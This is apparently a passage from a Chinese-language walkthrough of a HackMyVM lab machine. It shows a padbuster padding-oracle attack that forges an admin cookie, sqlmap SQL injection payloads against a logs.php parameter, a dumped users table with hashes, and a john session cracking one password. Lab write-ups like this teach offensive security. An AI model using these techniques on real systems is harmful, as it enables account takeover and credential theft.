<span class="token number">200</span>      GET       71l      142w     3015c http://cookie.kitty.hmv/login.php
<span class="token number">200</span>      GET       44l      380w     5555c http://cookie.kitty.hmv/assets/js/jquery.easing.min.js
<span class="token number">200</span>      GET       77l      166w     3796c http://cookie.kitty.hmv/register.php
<span class="token number">200</span>      GET        7l     1966w   155758c http://cookie.kitty.hmv/assets/css/bootstrap.min.css
<span class="token number">403</span>      GET        7l        9w      153c http://cookie.kitty.hmv/assets/img/
<span class="token number">200</span>      GET    11082l    61158w  2739069c http://cookie.kitty.hmv/assets/img/minions.gif
<span class="token number">200</span>      GET       37l      105w     2785c http://cookie.kitty.hmv/
<span class="token number">403</span>      GET        7l        9w      153c http://cookie.kitty.hmv/assets/css/
<span class="token number">403</span>      GET        7l        9w      153c http://cookie.kitty.hmv/assets/js/
<span class="token number">403</span>      GET        7l        9w      153c http://cookie.kitty.hmv/assets/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/img <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/img/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/home/profile <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/home/profile/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/css <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/css/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/js <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/js/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/config <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/config/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/img <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/img/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/css <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/css/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/js <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/js/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/vendor/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/tinymce <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/vendor/tinymce/
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/assets/dash/vendor/bootstrap <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/assets/dash/vendor/bootstrap/</code></pre>
<p>先注册一个号看看<br><img src="https://ooo.0x0.ooo/2024/08/16/OtK2lG.png" alt="OtK2lG.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/16/OtKXZI.png" alt="OtKXZI.png" loading="lazy"></p>
<h2 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h2><p>后台没找到什么洞，根据子域，看看cookie</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">GET /home/index.php HTTP/1.1

Host: cookie.kitty.hmv

User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv:109.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>

Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>

Accept-Encoding: gzip, deflate, br

Referer: http://cookie.kitty.hmv/

Connection: close

Cookie: <span class="token assign-left variable">auth</span><span class="token operator">=</span>pcN1woWNSdMu9msKL13dMnaY%2BkqN9jLg

Upgrade-Insecure-Requests: <span class="token number">1</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/16/OtKucD.png" alt="OtKucD.png" loading="lazy"><br>在hacktrick找到一个工具</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  padbuster http://cookie.kitty.hmv/home/index.php pcN1woWNSdMu9msKL13dMnaY+kqN9jLg <span class="token number">8</span> <span class="token parameter variable">-cookies</span> <span class="token assign-left variable">auth</span><span class="token operator">=</span>pcN1woWNSdMu9msKL13dMnaY+kqN9jLg                                                                       <span class="token punctuation">[</span><span class="token number">20</span>:40:58<span class="token punctuation">]</span>

+-------------------------------------------+
<span class="token operator">|</span> PadBuster - v0.3.3                        <span class="token operator">|</span>
<span class="token operator">|</span> Brian Holyfield - Gotham Digital Science  <span class="token operator">|</span>
<span class="token operator">|</span> labs@gdssecurity.com                      <span class="token operator">|</span>
+-------------------------------------------+

INFO: The original request returned the following
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Status: <span class="token number">302</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Location: <span class="token punctuation">..</span>/logout.php?err<span class="token operator">=</span><span class="token number">1</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Content Length: <span class="token number">0</span>

INFO: Starting PadBuster Decrypt Mode
*** Starting Block <span class="token number">1</span> of <span class="token number">2</span> ***

INFO: No error string was provided<span class="token punctuation">..</span>.starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID<span class="token comment">#	Freq	Status	Length	Location</span>
-------------------------------------------------------
<span class="token number">1</span>	<span class="token number">1</span>	<span class="token number">302</span>	<span class="token number">8144</span>	<span class="token punctuation">..</span>/login.php
<span class="token number">2</span> **	<span class="token number">255</span>	<span class="token number">302</span>	<span class="token number">0</span>	<span class="token punctuation">..</span>/logout.php?err<span class="token operator">=</span><span class="token number">1</span>
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID<span class="token comment"># marked with ** is recommended : </span>
Use of uninitialized value <span class="token variable">$input</span> <span class="token keyword">in</span> pattern match <span class="token punctuation">(</span>m//<span class="token punctuation">)</span> at /usr/bin/padbuster line <span class="token number">848</span>, <span class="token operator">&lt;</span>STDIN<span class="token operator">></span> line <span class="token number">1</span>.

Enter an ID that matches the error condition
NOTE: The ID<span class="token comment"># marked with ** is recommended : 2</span>

Continuing <span class="token builtin class-name">test</span> with selection <span class="token number">2</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">31</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">8</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">135</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">7</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">65</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">6</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">68</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">75</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">234</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">73</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">40</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">1</span><span class="token punctuation">]</span>

Block <span class="token number">1</span> Results:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cipher Text <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 2ef66b0a2f5ddd32
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Intermediate Bytes <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: d0b010b0b8bc7be0
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Plain Text: <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token number">123</span>

Use of uninitialized value <span class="token variable">$plainTextBytes</span> <span class="token keyword">in</span> concatenation <span class="token punctuation">(</span>.<span class="token punctuation">)</span> or string at /usr/bin/padbuster line <span class="token number">361</span>, <span class="token operator">&lt;</span>STDIN<span class="token operator">></span> line <span class="token number">2</span>.
*** Starting Block <span class="token number">2</span> of <span class="token number">2</span> ***

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">197</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">8</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">41</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">7</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">170</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">6</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">221</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">249</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">155</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">7</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">210</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">1</span><span class="token punctuation">]</span>

Block <span class="token number">2</span> Results:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cipher Text <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 7698fa4a8df632e0
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Intermediate Bytes <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 26fe63022755d53a
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Plain Text: 

-------------------------------------------------------
** Finished ***

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Decrypted value <span class="token punctuation">(</span>ASCII<span class="token punctuation">)</span>: <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token number">123</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Decrypted value <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 757365723D3132330808080808080808

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Decrypted value <span class="token punctuation">(</span>Base64<span class="token punctuation">)</span>: <span class="token assign-left variable">dXNlcj0xMjMICAgICAgICA</span><span class="token operator">==</span>

-------------------------------------------------------</code></pre>
<p>好牛逼，真跑出来了<br><img src="https://ooo.0x0.ooo/2024/08/16/OtK3OF.png" alt="OtK3OF.png" loading="lazy"><br>只有用户名，那么可以伪造成admin的cookie</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  padbuster http://cookie.kitty.hmv/home/index.php pcN1woWNSdMu9msKL13dMnaY+kqN9jLg <span class="token number">8</span> <span class="token parameter variable">-cookies</span> <span class="token assign-left variable">auth</span><span class="token operator">=</span>pcN1woWNSdMu9msKL13dMnaY+kqN9jLg <span class="token parameter variable">-plaintext</span> <span class="token assign-left variable">user</span><span class="token operator">=</span>admin                                                 <span class="token punctuation">[</span><span class="token number">20</span>:42:34<span class="token punctuation">]</span>

+-------------------------------------------+
<span class="token operator">|</span> PadBuster - v0.3.3                        <span class="token operator">|</span>
<span class="token operator">|</span> Brian Holyfield - Gotham Digital Science  <span class="token operator">|</span>
<span class="token operator">|</span> labs@gdssecurity.com                      <span class="token operator">|</span>
+-------------------------------------------+

INFO: The original request returned the following
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Status: <span class="token number">302</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Location: <span class="token punctuation">..</span>/logout.php?err<span class="token operator">=</span><span class="token number">1</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Content Length: <span class="token number">0</span>

INFO: Starting PadBuster Encrypt Mode
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Number of Blocks: <span class="token number">2</span>

INFO: No error string was provided<span class="token punctuation">..</span>.starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID<span class="token comment">#	Freq	Status	Length	Location</span>
-------------------------------------------------------
<span class="token number">1</span>	<span class="token number">1</span>	<span class="token number">302</span>	<span class="token number">8144</span>	<span class="token punctuation">..</span>/login.php
<span class="token number">2</span> **	<span class="token number">255</span>	<span class="token number">302</span>	<span class="token number">0</span>	<span class="token punctuation">..</span>/logout.php?err<span class="token operator">=</span><span class="token number">1</span>
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID<span class="token comment"># marked with ** is recommended : 2</span>

Continuing <span class="token builtin class-name">test</span> with selection <span class="token number">2</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">196</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">8</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">148</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">7</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">92</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">6</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">41</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">218</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">136</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">150</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">190</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">1</span><span class="token punctuation">]</span>

Block <span class="token number">2</span> Results:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> New Cipher Text <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 23037825d5a1683b
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Intermediate Bytes <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 4a6d7e23d3a76e3d

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">1</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">8</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">36</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">7</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">180</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">6</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">17</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">146</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">50</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">132</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success: <span class="token punctuation">(</span><span class="token number">135</span>/256<span class="token punctuation">)</span> <span class="token punctuation">[</span>Byte <span class="token number">1</span><span class="token punctuation">]</span>

Block <span class="token number">1</span> Results:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> New Cipher Text <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 0408ad19d62eba93
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Intermediate Bytes <span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>: 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------</code></pre>
<p>cookie替换一下之后主页多了个logs<br><img src="https://ooo.0x0.ooo/2024/08/16/OtKC76.png" alt="OtKC76.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/16/OtKwLP.png" alt="OtKwLP.png" loading="lazy"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>看这参数就想sqlmap一下，跑一下请求包</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">GET /home/logs.php?ajneya<span class="token operator">=</span>admin HTTP/1.1

Host: cookie.kitty.hmv

User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv:109.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>

Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: <span class="token assign-left variable">auth</span><span class="token operator">=</span>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA

Upgrade-Insecure-Requests: <span class="token number">1</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  sqlmap <span class="token parameter variable">-l</span> sql.txt <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--batch</span>                                                                                                                                                                          <span class="token punctuation">[</span><span class="token number">20</span>:57:33<span class="token punctuation">]</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.7<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>,<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  ['</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:57:40 /2024-08-16/

[20:57:40] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
[1/1] URL:
GET http://cookie.kitty.hmv:80/home/logs.php?ajneya=admin
Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
do you want to test this URL? [Y/n/q]
> Y
[20:57:40] [INFO] testing URL '</span>http://cookie.kitty.hmv:80/home/logs.php?ajneya<span class="token operator">=</span>admin<span class="token string">'
[20:57:40] [INFO] resuming back-end DBMS '</span>mysql<span class="token string">' 
[20:57:40] [INFO] using '</span>/root/.local/share/sqlmap/output/results-08162024_0857pm.csv<span class="token string">' as the CSV results file in multiple targets mode
[20:57:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ajneya (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ajneya=admin'</span><span class="token punctuation">)</span> AND <span class="token assign-left variable">4586</span><span class="token operator">=</span><span class="token number">4586</span> AND <span class="token punctuation">(</span><span class="token string">'dbUX'</span><span class="token operator">=</span><span class="token string">'dbUX

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ajneya=admin'</span><span class="token punctuation">)</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">3397</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>oBbq<span class="token punctuation">)</span> AND <span class="token punctuation">(</span><span class="token string">'sFQr'</span><span class="token operator">=</span><span class="token string">'sFQr

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: ajneya=admin'</span><span class="token punctuation">)</span> UNION ALL SELECT NULL,NULL,CONCAT<span class="token punctuation">(</span>0x716a767871,0x4a756b42576d47474c6c62554a616f674145554d574e55426645627a515345676d46465379596b4d,0x7171706271<span class="token punctuation">)</span>-- -
---
<span class="token keyword">do</span> you want to exploit this SQL injection? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">20</span>:57:40<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
web application technology: Nginx <span class="token number">1.18</span>.0
back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 <span class="token punctuation">(</span>MariaDB fork<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">20</span>:57:40<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching database names
available databases <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> padding

<span class="token punctuation">[</span><span class="token number">20</span>:57:40<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> you can <span class="token function">find</span> results of scanning <span class="token keyword">in</span> multiple targets mode inside the CSV <span class="token function">file</span> <span class="token string">'/root/.local/share/sqlmap/output/results-08162024_0857pm.csv'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">20</span>:57:40 /2024-08-16/</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">Table: <span class="token function">users</span>
<span class="token punctuation">[</span><span class="token number">3</span> entries<span class="token punctuation">]</span>
+----------------------------------+----------+
<span class="token operator">|</span> password                         <span class="token operator">|</span> username <span class="token operator">|</span>
+----------------------------------+----------+
<span class="token operator">|</span> 44db80f98c693eac47540c51137eeeac <span class="token operator">|</span> admin    <span class="token operator">|</span>
<span class="token operator">|</span> 357f47546ba3ab1cf633d3d0c54e2583 <span class="token operator">|</span> gitea    <span class="token operator">|</span>
<span class="token operator">|</span> 3d5a0f41ca359319a7b91e57f0af07f5 <span class="token operator">|</span> <span class="token number">123</span>      <span class="token operator">|</span>
+----------------------------------+----------+
+--------+--------------+
<span class="token operator">|</span> <span class="token builtin class-name">type</span>   <span class="token operator">|</span> value        <span class="token operator">|</span>
+--------+--------------+
<span class="token operator">|</span> salt   <span class="token operator">|</span> YXZpam5leWFt <span class="token operator">|</span>
+--------+--------------+
</code></pre>
<p>拿到加密的password，尤其是gitea，方便展开3000端口的探测<br>john跑一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> john.txt                                                                                                                                                                                             <span class="token punctuation">[</span><span class="token number">21</span>:04:07<span class="token punctuation">]</span>
357f47546ba3ab1cf633d3d0c54e2583<span class="token variable">$YXZpam5leWFt</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  john john.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt  <span class="token parameter variable">--format</span><span class="token operator">=</span><span class="token string">'dynamic=md5($p.$s)'</span>                                                                                                                 <span class="token punctuation">[</span><span class="token number">21</span>:04:09<span class="token punctuation">]</span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>dynamic<span class="token operator">=</span>md5<span class="token punctuation">(</span><span class="token variable">$p</span><span class="token builtin class-name">.</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">256</span>/256 AVX2 8x3<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
git0ffme         <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-08-16 <span class="token number">21</span>:04<span class="token punctuation">)</span> <span class="token number">2</span>.173g/s 17099Kp/s 17099Kc/s 17099KC/s gizmobob<span class="token punctuation">..</span>gisibu
Use the <span class="token string">"--show --format=dynamic=md5(<span class="token variable">$p</span>.<span class="token variable">$s</span>)"</span> options to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>拿到了gitea用户密码<code>git0ffme</code></p>
